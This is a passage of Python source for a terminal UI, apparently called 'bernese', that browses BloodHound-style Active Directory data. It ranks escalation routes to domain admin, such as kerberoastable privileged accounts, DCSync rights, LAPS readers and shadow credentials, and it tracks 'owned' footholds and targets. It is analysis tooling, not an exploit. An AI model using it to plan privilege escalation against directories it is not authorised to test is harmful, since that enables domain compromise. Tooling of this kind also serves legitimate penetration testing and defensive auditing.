    elif sid in priv:
        out.append(f"   {PRIV_MARK} privileged (effectively admin)", style=PRIV_STYLE)
    out.append("\n")
    why = why_highvalue(sid)
    if why:
        out.append(f"why it's powerful: {why}\n", style="red")
    if is_roast_admin(g, sid, priv):
        out.append("⚠ kerberoastable + privileged — crack it = instant admin\n", style="bold red")
    tg = node_tags(g, sid)
    if tg.plain.strip():
        out.append(tg)
        out.append("\n")
    desc = n.p("description")
    if desc:
        out.append(f"{desc}\n", style="italic grey70")

    # Properties — the same identity fields the node-info view shows (users/computers).
    # Shown ABOVE the group / member sections.
    if n.kind in ("User", "Computer"):
        rows = []
        for key, lab in bh._DETAIL_FIELDS:
            if key == "description":
                continue                       # already shown above
            v = n.p(key)
            if v in (None, "", [], False) and not (key == "enabled" and v is False):
                continue
            if isinstance(v, list):
                v = ", ".join(str(x) for x in v)
            elif key in ("pwdlastset", "lastlogontimestamp", "whencreated"):
                v = bh._fmt_ts(v)
            rows.append((lab, str(v)))
        if rows:
            out.append("\nProperties\n", style="bold")
            for lab, v in rows:
                out.append(f"  {lab + ':':<22}", style="grey62")
                out.append(f"{v}\n", style="white")

    # Member of — the groups a user / computer sits in (direct + nested), shortened
    if n.kind in ("User", "Computer"):
        grps = [s for s in bh._principal_closure(g, sid)
                if s != sid and g.nodes.get(s) and g.nodes[s].kind == "Group"]
        if grps:
            grps.sort(key=lambda s: (not bool(g.is_highvalue(s)), short(g, s).lower()))
            out.append(f"\nMember of ({len(grps)})\n", style="bold")
            for gs in grps[:10]:
                hvg = g.is_highvalue(gs)
                out.append(f"  {short(g, gs)}", style="red" if hvg else "yellow")
                out.append(f"  {STAR}\n" if hvg else "\n", style="bold red")
            if len(grps) > 10:
                out.append(f"  … +{len(grps) - 10} more\n", style="grey50")

    # Group detail — who is in it, and what rights it holds
    if n.kind == "Group":
        members = [m for m in bh._expand_members(g, sid)
                   if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer")]
        if members:
            members.sort(key=lambda s: (s not in priv, not bool(g.is_highvalue(s)), short(g, s).lower()))
            out.append(f"\nMembers ({len(members)})\n", style="bold")
            for m in members[:10]:
                mstyle = name_style_for(g, m, priv)
                out.append(f"  {short(g, m)}", style=mstyle)
                out.append(f"  ({g.nodes[m].kind})", style="grey50")
                if g.is_highvalue(m):
                    out.append(f"  {STAR}", style="bold red")
                elif m in priv:
                    out.append(f"  {PRIV_MARK}", style=mstyle)
                if is_kerberoastable(g, m):
                    out.append(f"  {KERB}", style="yellow")
                out.append("\n")
            if len(members) > 10:
                out.append(f"  … +{len(members) - 10} more\n", style="grey50")

    # High privileges this principal holds — the ACL control rights it wields directly
    # OR inherits through its groups (so e.g. a user with ReadLAPSPassword via a group
    # still shows it). Grouped by right, with how many objects each covers.
    eff = {}                                        # right -> set of target sids
    via = {}                                        # right -> True if only via a group
    for p in bh._principal_closure(g, sid):
        for (d, l) in g.ctrl.get(p, []):
            if l == "MemberOf":
                continue
            eff.setdefault(l, set()).add(d)
            if p != sid:
                via.setdefault(l, True)
            else:
                via[l] = False
    if eff:
        out.append("\nHigh privileges it holds\n", style="bold")
        for r, tgts in sorted(eff.items(), key=lambda x: -len(x[1]))[:12]:
            rstyle = "bold magenta" if r in bh._DANGER else "yellow"
            out.append(f"  {r}", style=rstyle)
            out.append(f"  over {len(tgts)} object(s)" + ("  (via group)" if via.get(r) else ""),
                       style="grey70")
            # name the single target (e.g. ReadLAPSPassword over ONE host) for context
            if len(tgts) == 1:
                out.append(f"  → {short(g, next(iter(tgts)))}", style="grey62")
            out.append("\n")
        if len(eff) > 12:
            out.append(f"  … +{len(eff) - 12} more right(s)\n", style="grey50")

    reach = g.reachable(sid)
    size = len(reach) - 1
    hvs = [s for s in reach if s != sid and g.is_highvalue(s)]
    best_sid = min(hvs, key=lambda s: reach[s][0]) if hvs else None
    out.append("\nWhere this leads\n", style="bold")
    if hv:
        out.append("  this node IS high-value\n", style="red")
    elif best_sid is not None:
        steps = reach[best_sid][0]
        out.append(f"  shortest path to {STAR} {g.is_highvalue(best_sid)}  "
                   f"({steps} step{'s' if steps != 1 else ''}):\n", style="red")
        out.append(_path_text(g, sid, best_sid, priv))
    _ng, n_rights, n_targets, n_reach = bh._control_counts(g, sid)
    if n_rights:
        out.append(f"  holds {n_rights} control right(s) over {n_targets} object(s)\n", style="white")
    else:
        out.append("  holds no control rights (direct or via groups)\n", style="grey50")
    if n_reach:
        out.append(f"  reach: {n_reach} node(s) by chaining memberships and rights\n", style="grey50")

    if n.kind == "Computer":
        ok, tags = bh._computer_value(g, sid, priv)
        if ok:
            out.append(f"\n{STAR} Why it matters\n", style="bold red")
            for t in tags:
                out.append(f"  · {t}\n", style="red")

    # SPNs only matter for USER accounts (kerberoastable) — a computer's host SPNs
    # are noise (its password is machine-managed and uncrackable), so don't show them.
    spns = n.p("serviceprincipalnames")
    if spns and n.kind == "User":
        if isinstance(spns, str):
            spns = [spns]
        out.append("\nSPNs (kerberoastable services → host)\n", style="bold")
        for s in spns[:8]:
            out.append(f"  {s}\n", style="cyan")
        if len(spns) > 8:
            out.append(f"  … +{len(spns) - 8} more\n", style="grey50")

    if n.kind == "User":
        macs = bh._user_machine_accounts(g, sid)
        admon = [d for (d, l) in g.ctrl.get(sid, []) if l == "AdminTo"]
        sess = [c for c, cn in g.nodes.items() if cn.kind == "Computer" and sid in cn.sessions]
        if admon or sess or macs:
            out.append("\nMachines tied to this user\n", style="bold")
            if admon:
                out.append(f"  local admin on {len(admon)}\n", style="cyan")
            if sess:
                out.append(f"  has a session on {len(sess)}\n", style="cyan")
            if macs:
                out.append(f"  owns/created {len(macs)}\n", style="cyan")

    inbound = g.rctrl.get(sid, [])
    if inbound:
        out.append(f"\nControlled by {len(inbound)} principal(s)\n", style="bold")
    return out


def capture(fn, *a, **kw):
    """Run a bernese cmd_* (which prints coloured ANSI) and return its output as
    rich Text — reuses every CLI analysis verbatim inside a scroll pane. Emoji-
    presentation glyphs are swapped for plain markers to match the TUI."""
    buf = io.StringIO()
    old = bh.C.enabled
    bh.C.enabled = True
    try:
        with contextlib.redirect_stdout(buf):
            fn(*a, **kw)
    except Exception as e:                       # never let one analysis kill the UI
        return Text(f"[analysis error: {e}]", style="red")
    finally:
        bh.C.enabled = old
    s = buf.getvalue()
    for bad, good in _DEMOJI.items():
        s = s.replace(bad, good)
    return Text.from_ansi(s.rstrip("\n") or "(nothing)")


def _section(t, title):
    t.append(f"{title}\n", style="bold grey62")


def dashboard_top(g):
    """The compact fact line at the very top of the overview — just the domain and the
    MAQ flag. Populations and position live in the clickable list below."""
    t = Text()
    doms = bh._domains(g)
    t.append(f"{g.domain_name or '?'}", style="bold cyan")
    me = next((d for d in doms if d["primary"]), None)
    if me and me["role"] == "forest root":
        t.append("  root", style="bold magenta")
    t.append("\n")
    others = [d for d in doms if not d["primary"]]
    if others:
        # the other known domains on ONE line, cut off with "…" so the narrow overview
        # doesn't wrap: the forest root first (tagged), then the rest
        budget = 40
        t.append("+ ", style="grey50")
        used = 2
        for i, d in enumerate(others):
            tag = " root" if d["role"] == "forest root" else ""
            piece = d["name"] + tag + (", " if i < len(others) - 1 else "")
            more = f"… +{len(others) - i}"
            if used + len(piece) > budget and i:
                t.append(more, style="grey50")
                break
            t.append(d["name"], style="cyan" if d["collected"] else "grey70")
            if tag:
                t.append(tag, style="bold magenta")
            if i < len(others) - 1:
                t.append(", ", style="grey50")
            used += len(piece)
        t.append("\n")
    if isinstance(g.maq, int):
        t.append(f"MAQ {g.maq}" + ("  — any user can add machines" if g.maq > 0 else ""),
                 style="red" if g.maq > 0 else "grey70")
    return t


def _fastest_win(g, app):
    """(headline, dispatch_id) for the quickest route to domain admin — the out-of-band
    credential wins first (no ACL chain), else the start node's own path. The id lets
    the overview row route to the relevant view. Cheap (no full non-admin sweep)."""
    priv = app.priv
    roast = [n for n in g.nodes.values() if n.kind == "User"
             and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"
             and (n.sid in priv or g.is_highvalue(n.sid))]
    if roast:
        return f"roast {short(g, roast[0].sid)} ⇒ DA", "kerb"
    dcs = set()
    for d in g.domain_sids:
        for (s, l) in g.rctrl.get(d, []):
            if (l == "DCSync" or l in bh.REPL_RIGHTS) and not bh._is_default_dcsync(g, s):
                dcs.add(s)
    if dcs:
        return f"DCSync via {short(g, sorted(dcs)[0])} ⇒ all hashes", "dcsync"
    laps = sorted({r for r, _c in bh._laps_readers(g)})
    if laps:
        return f"{short(g, laps[0])} reads LAPS ⇒ local admin", "laps"
    # otherwise the quickest route from any owned foothold
    best = None
    for s in sorted(app.owned, key=lambda s: short(g, s).lower()):
        if not s or g.is_highvalue(s):
            continue
        rt = route_tag(g, s)
        if rt and (best is None or rt[2] < best[1][2]):
            best = (s, rt)
    if best:
        s, (tech, tgt, hops) = best
        return f"{short(g, s)}: {tech} ⇒ {_tgt_short(tgt)} ({hops}h)", s
    return None, None


# dangerous rights ranked for the "what this start node holds" headline — a start may
# have no ACL *path* to a high-value node yet still wield very powerful rights (e.g.
# ReadLAPSPassword over every workstation = local admin everywhere).
_RIGHT_RANK = {
    "DCSync": 6, "GenericAll": 5, "WriteDacl": 5, "WriteOwner": 5, "Owns": 5, "Owner": 5,
    "ForceChangePassword": 4, "AddKeyCredentialLink": 4, "AllExtendedRights": 4,
    "ReadLAPSPassword": 4, "ReadGMSAPassword": 4, "GenericWrite": 3, "AddMember": 3,
}
_RIGHT_EFFECT = {
    "DCSync": "dump every hash", "ReadLAPSPassword": "local admin on them",
    "ReadGMSAPassword": "read gMSA password", "ForceChangePassword": "reset their password",
    "AddKeyCredentialLink": "shadow-credential them",
}


def route_tag(g, sid):
    """(first real technique, high-value target label, hops) of `sid`'s shortest route to a
    high-value node — the step that actually escalates, skipping free MemberOf hops — or None."""
    _s, _hv, best = bh._user_profile(g, sid)
    if not best:
        return None
    reach = g.reachable(sid)
    tgt = min((h for h in reach if h != sid and g.is_highvalue(h)), key=lambda h: reach[h][0])
    path = g.bfs_path(sid, tgt) or []
    tech = next((l for _n, l in path[1:] if l and l != "MemberOf"), "MemberOf")
    return tech, best[0], best[1]


def _tgt_short(label):
    return "domain" if label == "Domain compromise" else label


def start_power(g, sid):
    """The single most powerful ACL right `sid` holds directly or via its groups, as
    (right, target_count, effect) — or None. Lets the overview flag a strong foothold
    (LAPS reader, DCSync, mass GenericAll) even when there's no ACL path to a DA node."""
    eff = {}
    for p in bh._principal_closure(g, sid):
        for (d, l) in g.ctrl.get(p, []):
            if l != "MemberOf":
                eff.setdefault(l, set()).add(d)
    if not eff:
        return None
    if "DCSync" in eff:                              # full-domain right trumps everything
        best = "DCSync"
    else:
        # otherwise pick by BREADTH among the dangerous rights — ReadLAPSPassword over
        # 1296 hosts beats GenericAll over 2, even though GenericAll ranks higher.
        danger = {r: v for r, v in eff.items() if _RIGHT_RANK.get(r, 1) >= 3}
        pool = danger or eff
        best = max(pool, key=lambda r: (len(eff[r]), _RIGHT_RANK.get(r, 1)))
    return best, len(eff[best]), _RIGHT_EFFECT.get(best, f"control {len(eff[best])} object(s)")


def dashboard_position_rows(g, app):
    """Clickable position rows for the overview: OWNED footholds, your TARGETS (with whether
    the owned set reaches each), and the single FASTEST WIN. Each is (id, Text, enabled)."""
    priv = app.priv
    rows = []
    # OWNED — a header, then one row per foothold with the strongest right IT wields (so an
    # owned foothold's privesc shows here even when it is not the current start node).
    W = 42                                      # usable width of the overview column
    priv = app.priv

    def node_row(rid, icon, s, extra):
        """'  <icon> NAME ◆ 🎟  <extra>' — the name styled like everywhere else (kind colour,
        privileged / high-value / kerberoastable markers); `extra` drops to its own line
        when the row would be too wide for the column."""
        lab = Text(f"  {icon} ")
        lab.append_text(ntext(g, s, priv=priv, kind=False))
        if extra and cell_len(lab.plain) + 2 + cell_len(extra.plain) <= W:
            lab.append("  ")
            lab.append_text(extra)
            extra = None
        rows.append((rid, lab, True))
        if extra:
            rows.append((rid, Text("      ").append_text(extra), True))

    if app.owned:
        rows.append(("owned_view", Text(f"OWNED ({len(app.owned)})", style="bold grey62"), True))
        for s in sorted(app.owned, key=lambda s: short(g, s).lower()):
            pw = start_power(g, s)
            node_row(s, OWNED + (TARGET if s in app.targets else ""), s,
                     Text(f"{pw[0]} ×{pw[1]}", style="red") if pw else None)
    else:
        rows.append(("owned_view", Text("OWNED  none — highlight a node and press Ctrl+O",
                                        style="bold grey62"), False))
    # TARGETS — a header, then one row per 🎯 with whether the owned set reaches it
    if app.targets:
        reach = app.owned_reach()
        rows.append(("owned_view", Text(f"TARGETS ({len(app.targets)})", style="bold grey62"), True))
        for s in sorted(app.targets, key=lambda s: short(g, s).lower()):
            if s in app.owned:
                node_row(f"tgt_{s}", OWNED + TARGET, s, None)
                continue
            if s in reach:
                extra = Text(f"{REACH_MARK} {reach[s][0]}h via {short(g, reach[s][1])}",
                             style="bold green")
            elif app.owned:
                extra = Text("✗ no path", style="bold red")
            else:
                extra = Text("own something first", style="grey50")
            node_row(f"tgt_{s}", TARGET, s, extra)
    rows.append(("_spacer", Text(""), False))         # one blank line under the OWNED block
    # FASTEST WIN — the single quickest route to domain admin
    win, target = _fastest_win(g, app)
    if win:
        lab = Text(f"{'FASTEST':<8}", style="bold green")
        lab.append(win, style="bold red")
        rows.append((target, lab, True))
    else:
        rows.append(("start_tree", Text(f"{'FASTEST':<8}no obvious one-shot — work the routes below",
                                        style="grey50"), False))
    return rows


def dashboard_rows(g):
    """The clickable population rows for the overview — (dispatch_id, label, count).
    Selecting one routes through HomeScreen.dispatch, same as the menu."""
    users = sum(1 for n in g.nodes.values() if n.kind == "User")
    comps = sum(1 for n in g.nodes.values() if n.kind == "Computer")
    groups = sum(1 for n in g.nodes.values() if n.kind == "Group")
    dcs = sum(1 for s, n in g.nodes.items() if n.kind == "Computer" and bh._is_dc(g, s))
    das = len({s for s in bh._da_member_set(g) if g.nodes.get(s)})
    kerb = sum(1 for n in g.nodes.values() if n.kind == "User"
               and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502")
    asrep = sum(1 for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth"))
    dcsync = set()
    for d in g.domain_sids:
        for (s, l) in g.rctrl.get(d, []):
            if l == "DCSync" or l in bh.REPL_RIGHTS:
                dcsync.add(s)
    laps = len({r for r, _c in bh._laps_readers(g)})
    adcs = len(g.templates)
    return [
        ("users", "Users", users),
        ("computers", "Computers", comps),
        ("groups", "Groups", groups),
        ("dcs", "Domain controllers", dcs),
        ("das", "Domain admins & high-value", das),
        ("kerb", "Kerberoastable", kerb),
        ("asrep", "AS-REP roastable", asrep),
        ("dcsync", "DCSync-capable", len(dcsync)),
        ("laps", "LAPS readers", laps),
        ("adcs", "ADCS templates", adcs),
    ]


class Overview(Vertical):
    """Left dashboard, all CLICKABLE: your POSITION (start + its shortest path), OWNED,
    the single FASTEST WIN, then the population list (Users / Computers / Groups / …).
    Domain facts sit at the top."""

    def __init__(self, g):
        super().__init__()
        self.g = g

    def compose(self) -> ComposeResult:
        yield Static(id="dashtop")
        yield OptionList(id="jump")

    def on_mount(self):
        self.refresh_data()

    def refresh_data(self):
        self.query_one("#dashtop", Static).update(dashboard_top(self.g))
        jump = self.query_one("#jump", OptionList)
        jump.clear_options()
        # position / owned / fastest win first (clickable). Option ids must be unique,
        # so index-prefix the (possibly repeated) dispatch target; dispatch decodes it.
        for i, (tgt, label, enabled) in enumerate(dashboard_position_rows(self.g, self.app)):
            jump.add_option(Option(label, id=f"p{i}:{tgt}", disabled=not enabled))
        jump.add_option(Option(Text(""), disabled=True))          # spacer
        # then populations, padded to a common width so the counts line up
        rows = dashboard_rows(self.g)
        w = max(len(lbl) for _m, lbl, _c in rows)
        for mid, label, count in rows:
            lab = Text(f"{label:<{w}}  ", style="white" if count else "grey50")
            lab.append(f"{count:>5}", style="bold cyan" if count else "grey50")
            jump.add_option(Option(lab, id=mid, disabled=not count))


class DetailPane(VerticalScroll):
    """The compact node-detail pane in the left column. Scrolls when content overflows,
    and clicking it opens the full node info for whatever node it is showing."""

    def __init__(self):
        super().__init__(id="sidedetailbox")
        self.sid = None

    def compose(self) -> ComposeResult:
        yield Static(id="sidedetail")

    def on_click(self, event):
        if self.sid:
            self.app.show_node_info(self.sid)


def has_power(g, sid, memo):
    """True if being in this group (directly or via nesting) grants any real
    (non-MemberOf) control — hides dead-end memberships from the attack tree."""
    if sid in memo:
        return memo[sid]
    memo[sid] = False                       # cycle guard
    res = bool(g.is_highvalue(sid))         # reaching a high-value group is itself the win
    if not res:
        for (dst, lbl) in g.ctrl.get(sid, []):
            if lbl != "MemberOf":
                res = True
                break
            if has_power(g, dst, memo):
                res = True
                break
    memo[sid] = res
    return res


# --------------------------------------------------------------------------- #
# a reusable searchable table of principals
# --------------------------------------------------------------------------- #
class PrincipalTable(Vertical):
    """Search box (focused by default — just type) + sortable table + a detail
    pane along the bottom. ↑↓ move even while typing; Enter drills in."""

    # counts default to descending (biggest first); text columns to ascending
    _DESC_DEFAULT = {"GROUPS", "CTRL"}

    def action_toggle_disabled(self):
        self.hide_disabled = not self.hide_disabled
        self.rebuild()

    def __init__(self, g, sids, title, prof_cache, show_kind=True, escalation=False, reach=False):
        super().__init__()
        self.g = g
        self.all_sids = list(sids)
        self.title = title
        self.prof = prof_cache
        self.show_kind = show_kind
        self.escalation = escalation        # add an ESCALATION column (route to high-value)
        self.reach = reach                  # add a REACH column (path from the owned set)
        self.sort_col = None           # None = interest default; otherwise a column index
        self.sort_active = False        # a column can be SELECTED (highlighted) without sorting yet
        self.sort_desc = False
        self.hide_disabled = False
        self.filter = ""
        self.search_col = "NAME"       # which column the search box matches against (^f cycles)
        self._last_sel = (None, 0.0)   # (sid, time) for double-click detection
        self._rows = []
        self._col_keys = []
        self._col_names = []

    def compose(self) -> ComposeResult:
        yield Input(placeholder="search NAME…", id="filter")
        yield Static(id="tblhelp")                       # visible key legend under the box
        yield DataTable(id="tbl", cursor_type="row", zebra_stripes=True)

    def _help_bar(self):
        t = Text()
        t.append("keys  ", style="grey50")
        keys = [("click a column header", "sort + search that column")]
        if self.reach:
            keys += [("Enter", "node info + path"), ("^t", "target"), ("^o", "own")]
        else:
            keys += [("Enter", "explore"), ("^o", "own"), ("^t", "target")]
        keys += [("^e", "enabled-only"), ("^x", "export")]
        for key, what in keys:
            t.append(f" {key} ", style="bold black on grey58")
            t.append(f" {what}   ", style="grey70")
        return t

    def on_mount(self):
        t = self.query_one("#tbl", DataTable)
        self._col_names = (["NAME"] + (["KIND"] if self.show_kind else [])
                           + (["REACH"] if self.reach else [])
                           + (["ESCALATION"] if self.escalation else [])
                           + ["GROUPS", "CTRL", "PWSET", "LOGON", "DESC", "TAGS"])
        self._col_keys = list(t.add_columns(*self._col_names))
        self.query_one("#tblhelp", Static).update(self._help_bar())
        self.rebuild()
        self.query_one("#filter", Input).focus()        # default to type-to-search

    def _desc(self, s):
        n = self.g.nodes.get(s)
        if n and n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames")):
            svcs = spn_services(n)
            if svcs:
                return "SPN: " + ", ".join(svcs[:5])
        d = (n.p("description") if n else "") or ""
        if n and n.kind == "Computer" and not d:
            d = n.p("operatingsystem") or ""
        return str(d).replace("\n", " ")[:48]

    def _escalation(self, s):
        """(route text, is_highvalue_target) for a principal's shortest route to a
        high-value target, e.g. '→ Group Policy Creator Owners (3 hops)', or ('', False)."""
        g = self.g
        if g.is_highvalue(s):
            return "IS high-value", True
        _size, _hv, best = bh._user_profile(g, s)
        if best:
            return f"→ {best[0]} ({best[1]} hop{'s' if best[1] != 1 else ''})", True
        return "no ACL path", False

    def _reach_info(self, s):
        """(sort key, cell Text) for the REACH column: owned / ✓ hops · via / no path."""
        if s in self.app.owned:
            return -1, Text(f"{OWNED} owned", style=OWNED_STYLE)
        r = self.app.owned_reach().get(s)
        if r:
            return r[0], Text(f"{REACH_MARK} {r[0]}h · {short(self.g, r[1])}", style="bold green")
        if not self.app.owned:
            return 999, Text("- (own something: ^o)", style="grey42")
        return 999, Text("-", style="grey42")

    _TS_PROP = {"PWSET": "pwdlastset", "LOGON": "lastlogontimestamp"}

    def _ts(self, s, col):
        """(epoch sort key, display Text) for the PWSET / LOGON timestamp columns."""
        n = self.g.nodes.get(s)
        epoch, txt = _ts_parse(n.p(self._TS_PROP[col]) if n else None)
        return epoch, Text(txt, style="grey70" if epoch > 0 else "grey42")

    def _ctrl_count(self, s):
        return sum(1 for (_d, l) in self.g.ctrl.get(s, []) if l != "MemberOf")

    def _is_disabled(self, s):
        n = self.g.nodes.get(s)
        en = n.p("enabled") if n else None
        return en is not None and not bh._truthy(en)

    def _interest_key(self, s):
        g, nm = self.g, short(self.g, s).lower()
        if self.reach:                          # targets list: marked targets, then reachable
            return (s not in self.app.targets, self._reach_info(s)[0], nm)
        spn = bool(g.nodes[s].p("hasspn") or g.nodes[s].p("serviceprincipalnames")) if s in g.nodes else False
        return (not bh._is_admin(g, s), not bool(g.is_highvalue(s)),
                not spn, -self._ctrl_count(s), nm)                 # interest (all cheap)

    def _col_key(self, s, col):
        g, n = self.g, self.g.nodes.get(s)
        if col == "KIND":
            return (n.kind if n else "?").lower()
        if col == "REACH":
            return self._reach_info(s)[0]
        if col == "ESCALATION":
            _s, _h, best = bh._user_profile(g, s)
            return best[1] if best else 999            # fewest hops first
        if col == "GROUPS":
            return len(bh._direct_groups(g, s))
        if col == "CTRL":
            return self._ctrl_count(s)
        if col in self._TS_PROP:
            return self._ts(s, col)[0]                             # epoch — newest last
        if col == "DESC":
            return self._desc(s).lower()
        if col == "TAGS":
            return node_tags(g, s).plain.strip().lower()
        return short(g, s).lower()                                 # NAME

    def _col_text(self, s, col):
        """The searchable text of a column's cell (lowercased) — used to filter within
        the chosen search column."""
        g = self.g
        if col == "KIND":
            return (g.nodes[s].kind if s in g.nodes else "?").lower()
        if col == "REACH":
            return self._reach_info(s)[1].plain.lower()
        if col == "ESCALATION":
            return self._escalation(s)[0].lower()
        if col == "GROUPS":
            return ", ".join(bh._group_names(g, s, limit=99)).lower()
        if col == "CTRL":
            return str(self._ctrl_count(s))
        if col in self._TS_PROP:
            return self._ts(s, col)[1].plain.lower()
        if col == "DESC":
            return self._desc(s).lower()
        if col == "TAGS":
            return node_tags(g, s).plain.strip().lower()
        return short(g, s).lower()                                 # NAME

    def _match(self, s):
        return self.filter.lower() in self._col_text(s, self.search_col)

    def _name_cell(self, s):
        t = Text()
        # no "(User)" suffix here — the table already has a KIND column
        t.append_text(ntext(self.g, s, star=False, priv=self.app.priv, kind=False))
        if s in self.app.owned:
            t.append(f"  {OWNED_TAG}", style=OWNED_STYLE)
        if s in self.app.targets:
            t.append(f"  {TARGET}", style=TARGET_STYLE)
        return t

    def _ctrl_cell(self, s):
        n = self.g.nodes.get(s)
        if n and n.kind == "Computer" and bh._is_dc(self.g, s):
            return Text(f"{STAR} Domain Controller", style="bold red")
        c = self._ctrl_count(s)
        if c:
            return Text(f"controls {c}", style="red" if c > 50 else "white")
        return Text("-", style="grey50")

    def rebuild(self):
        g, t = self.g, self.query_one("#tbl", DataTable)
        t.clear()
        rows = [s for s in self.all_sids if self._match(s)]
        if self.hide_disabled:
            rows = [s for s in rows if not self._is_disabled(s)]
        if self.sort_col is None or not self.sort_active:
            rows.sort(key=self._interest_key)           # column selected but not yet sorting
        else:
            col = self._col_names[self.sort_col]
            rows.sort(key=lambda s: self._col_key(s, col), reverse=self.sort_desc)
        self._rows = rows[:TABLE_CAP]
        for s in self._rows:
            gn = bh._group_names(g, s, limit=2)              # keep the GROUPS column narrow
            grps = ", ".join(gn)
            if len(grps) > 22:
                grps = grps[:21] + "…"
            cells = [self._name_cell(s)]
            if self.show_kind:
                kind = g.nodes[s].kind if s in g.nodes else "?"
                cells.append(Text(kind, style=KIND_COLOR.get(kind, "white")))
            if self.reach:
                cells.append(self._reach_info(s)[1])
            if self.escalation:
                route, reaches = self._escalation(s)
                cells.append(Text(route, style="bold red" if reaches else "grey50"))
            cells += [Text(grps, style="grey70"), self._ctrl_cell(s),
                      self._ts(s, "PWSET")[1], self._ts(s, "LOGON")[1],
                      Text(self._desc(s), style="grey62"), node_tags(g, s)]
            t.add_row(*cells, key=s)
        if self.sort_col is None:
            srt = "interest"
        elif not self.sort_active:
            srt = self._col_names[self.sort_col] + " (selected — click again to sort)"
        else:
            srt = self._col_names[self.sort_col] + (" ▼" if self.sort_desc else " ▲")
        filt = "  ·  enabled only" if self.hide_disabled else ""
        scol = f"  ·  search: {self.search_col}" if self.search_col != "NAME" else ""
        shown = (f"{len(self._rows)} of {len(rows)} shown (type to narrow)"
                 if len(rows) > len(self._rows) else f"{len(rows)} shown")
        t.border_title = f"{self.title}  ·  {shown}  ·  sort: {srt}{scol}{filt}"
        try:                                              # show which column the search hits
            self.query_one("#filter", Input).placeholder = f"search {self.search_col}…"
        except Exception:
            pass
        self._refresh_headers()
        if self._rows:
            self._update_detail(self._rows[0])

    def _refresh_headers(self):
        """Highlight ONLY the selected column's header cell (reverse video), and add an
        ▲/▼ arrow once it is actually sorting."""
        t = self.query_one("#tbl", DataTable)
        for i, key in enumerate(self._col_keys):
            label = self._col_names[i]
            if i == self.sort_col:
                if self.sort_active:
                    label = f"{label} {'▼' if self.sort_desc else '▲'}"
                try:
                    t.columns[key].label = Text(label, style="bold black on cyan")
                except Exception:
                    pass
            else:
                try:
                    t.columns[key].label = Text(label)
                except Exception:
                    pass
        t.refresh()

    def on_data_table_header_selected(self, event: DataTable.HeaderSelected):
        # clicking a column focuses interaction on it (highlights the header, filters the
        # search box within it). The FIRST click only selects; the second sorts ascending,
        # the third descending, and further clicks keep flipping.
        col = event.column_index
        if self.sort_col != col:
            self.sort_col = col
            self.sort_active = False                         # 1st click: select only, no sort
            self.sort_desc = False
        elif not self.sort_active:
            self.sort_active = True                          # 2nd click: sort ascending
            self.sort_desc = False
        else:
            self.sort_desc = not self.sort_desc              # 3rd+: descending, then flip
        self.search_col = self._col_names[col]               # search this column too
        self.rebuild()

    def _update_detail(self, sid):
        self.app.set_detail(sid)                  # shared pane in the left column

    def _current_sid(self):
        t = self.query_one("#tbl", DataTable)
        if self._rows and t.cursor_row is not None and 0 <= t.cursor_row < len(self._rows):
            return self._rows[t.cursor_row]
        return self._rows[0] if self._rows else None

    def on_input_changed(self, event: Input.Changed):
        self.filter = event.value
        self.rebuild()

    def on_input_submitted(self, event: Input.Submitted):
        sid = self._current_sid()
        if sid:
            if self.reach:
                self.app.show_node_info(sid)      # targets list: Enter = is there a path?
            else:
                self.app.open_start(sid)

    def _export_sids(self):
        """The full filtered + sorted list (no display cap) for export."""
        rows = [s for s in self.all_sids if self._match(s)]
        if self.hide_disabled:
            rows = [s for s in rows if not self._is_disabled(s)]
        if self.sort_col is None or not self.sort_active:
            rows.sort(key=self._interest_key)
        else:
            col = self._col_names[self.sort_col]
            rows.sort(key=lambda s: self._col_key(s, col), reverse=self.sort_desc)
        return rows

    def export_to_file(self, fields):
        """Write the current (filtered + sorted) list to a tab-separated .txt in the
        working dir. `fields` is a list of field ids (or a legacy preset-name string)."""
        import os
        import time
        rows = self._export_sids()
        slug = "".join(c if c.isalnum() else "_" for c in self.title.lower()).strip("_")[:40]
        path = os.path.join(os.getcwd(), f"bernese_{slug}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        with open(path, "w") as fh:
            for s in rows:
                fh.write(export_line(self.g, s, fields) + "\n")
        return path, len(rows)

    def on_key(self, event):
        if event.key == "ctrl+e":                 # toggle the enabled-only filter
            self.action_toggle_disabled(); event.stop(); return
        if event.key == "ctrl+x":                 # export the current list to a .txt
            self.app.push_screen(ExportScreen(self)); event.stop(); return
        # (the search column is chosen by clicking a column header — no ^f cycle anymore)
        t = self.query_one("#tbl", DataTable)
        if not self._rows:
            return
        cur = t.cursor_row or 0
        if event.key == "down":
            t.move_cursor(row=min(cur + 1, len(self._rows) - 1)); event.stop()
        elif event.key == "up":
            t.move_cursor(row=max(cur - 1, 0)); event.stop()
        elif event.key == "pagedown":
            t.move_cursor(row=min(cur + 12, len(self._rows) - 1)); event.stop()
        elif event.key == "pageup":
            t.move_cursor(row=max(cur - 12, 0)); event.stop()

    def on_data_table_row_highlighted(self, event: DataTable.RowHighlighted):
        if event.row_key is not None and event.row_key.value:
            self._update_detail(event.row_key.value)

    def on_data_table_row_selected(self, event: DataTable.RowSelected):
        # single click/Enter inspects (left detail pane); DOUBLE-click opens full node
        # info. The start node changes only on Ctrl+S, never on a click.
        if event.row_key is None or not event.row_key.value:
            return
        sid = event.row_key.value
        now = time.monotonic()
        last_sid, last_t = self._last_sel
        self._last_sel = (sid, now)
        if sid == last_sid and (now - last_t) < 0.5:
            self.app.show_node_info(sid)
        else:
            self._update_detail(sid)

    def mark_owned(self):
        self._toggle_in(self.app.owned)

    def mark_target(self):
        self._toggle_in(self.app.targets)

    def _toggle_in(self, bucket):
        sid = self._current_sid()
        if not sid:
            return
        bucket.discard(sid) if sid in bucket else bucket.add(sid)
        cur = (self.query_one("#tbl", DataTable).cursor_row) or 0
        self.rebuild()
        self.query_one("#tbl", DataTable).move_cursor(row=cur)


# --------------------------------------------------------------------------- #
# shared attack-tree machinery (one node, or a synthetic root of categories)
# --------------------------------------------------------------------------- #
class AttackTreeBase(Vertical):
    """A Tree + detail pane with the drill/drop-down logic shared by the attack-tree
    explorer and the rights browser. Space/Enter drops a node down; a leaf opens its
    full searchable list or drills into its own attack tree."""

    BINDINGS = [Binding("y", "yank", "Copy line/section")]

    def compose(self) -> ComposeResult:
        tree = Tree("", id="tree")
        tree.show_root = True
        yield tree

    def _focused_tree(self):
